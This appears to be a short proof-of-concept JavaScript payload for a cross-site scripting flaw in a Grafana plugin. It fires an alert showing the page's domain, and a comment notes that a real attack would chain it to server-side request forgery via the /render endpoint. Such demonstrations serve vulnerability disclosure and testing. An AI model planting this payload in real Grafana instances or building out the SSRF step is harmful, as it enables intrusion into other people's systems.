// module.js
console.log("XSS Triggered");
alert("XSS via Grafana Plugin: " + document.domain);
// In a real SSRF attack, this script would fetch the /render endpoint
